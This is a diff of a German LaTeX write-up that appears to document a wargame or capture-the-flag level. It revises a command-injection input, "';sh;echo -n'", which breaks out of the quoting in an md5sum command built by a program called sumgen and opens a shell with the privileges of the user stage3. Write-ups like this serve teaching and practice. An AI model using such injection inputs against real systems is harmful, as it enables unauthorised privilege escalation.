@@ -353,7 +353,7 @@ echo -n 'EINGABE' | md5sum
 \end{verbatim}
 Wir schafften es mittels der folgenden Eingabe eine Shell mit den Rechten von stage3 zu öffnen:
 \begin{verbatim}
-./sumgen md5 "';sh"
+./sumgen md5 "';sh;echo -n'"
 \end{verbatim}
 Wir wechselten mittels 
 \begin{verbatim}
